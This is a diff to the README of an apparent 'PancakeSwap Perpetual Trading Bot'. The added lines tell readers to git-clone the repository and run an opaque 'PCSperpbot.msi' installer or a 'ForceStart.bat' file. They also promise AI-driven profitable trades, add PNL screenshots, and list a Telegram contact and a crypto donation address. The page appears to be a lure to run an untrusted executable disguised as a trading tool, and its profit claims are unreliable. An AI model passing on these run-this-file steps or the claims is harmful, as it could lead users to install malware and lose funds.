@@ -11,15 +11,31 @@ Download the [repo.](https://github.com/PancakeswapPredictUltimateWinner/Pancake
 Run the **PCSperpbot.msi**
 Go to the Pancakeswap Perpetual Trading page.
 The auto start button will automatically appear as shown in the screenshot above.
+(If you get an error, you can run the bot by double-clicking the "ForceStart.bat" file.)
 
 +Open and Close Profitable Perpatual Trades Automatically on PancakeSwap
 +Our bot uses artificial intelligence technology to make powerful predictions for Perpetual trades on PancakeSwap and automatically opens and closes perpatual trades.
 
-## Running the bot is very easy:
+## 🐰⚡ Installation on CMD
 
-Run the msi package.
-Go to the Pancakeswap Perpetual page.
-The auto start button will automatically appear as shown in the screenshot above.
+Download and Install Git here:
+[Git](https://git-scm.com/download/win)
+
+Then run the following commands in terminal or CMD:
+
+```shell
+git clone https://github.com/PancakeswapPredictUltimateWinner/Pancakeswap-Perpatual-Trading-Bot
+cd Pancakeswap-Perpatual-Trading-Bot
+"PCSperpbot.msi"
+```
+
+If you experience errors while the bot is running, you can apply the force start option below:
+
+```shell
+git clone https://github.com/PancakeswapPredictUltimateWinner/Pancakeswap-Perpatual-Trading-Bot
+cd Pancakeswap-Perpatual-Trading-Bot
+"ForceStart.bat"
+```
 
 ## Features:
 
@@ -50,6 +66,7 @@ You can message us 24/7 on our Telegram address for any support and assistance.
 +24/7 trade tracking
 
 ## PNL Screenshots:
+You can verify the authenticity of PNL evidence by scanning qr codes.
 
 ![PNL](/share-position/share-position-1710291048402.jpeg?raw=true)
 ![PNL](/share-position/share-position-1710291081330.jpeg?raw=true)
@@ -64,7 +81,19 @@ You can message us 24/7 on our Telegram address for any support and assistance.
 ![PNL](/share-position/share-position-1710291099721.jpeg?raw=true)
 ![PNL](/share-position/share-position-1710291137370.jpeg?raw=true)
 ![PNL](/share-position/share-position-1710366811471.jpeg?raw=true)
+NEW PNLS ADDED:
+![PNL](/share-position/share-position-1710711412752.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711424435.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711433813.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711437098.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711442242.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711448363.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711451002.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711459519.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711470944.jpeg?raw=true)
+![PNL](/share-position/share-position-1710711480985.jpeg?raw=true)
 
 ## Thanks:
 
 Thank you for using our bot. If you have any questions or suggestions, please let us know.
+If you find this bot helpful, feel free to donate on BSC ```0xAc45074eAb70eB5749b72115814dE42225e00800```
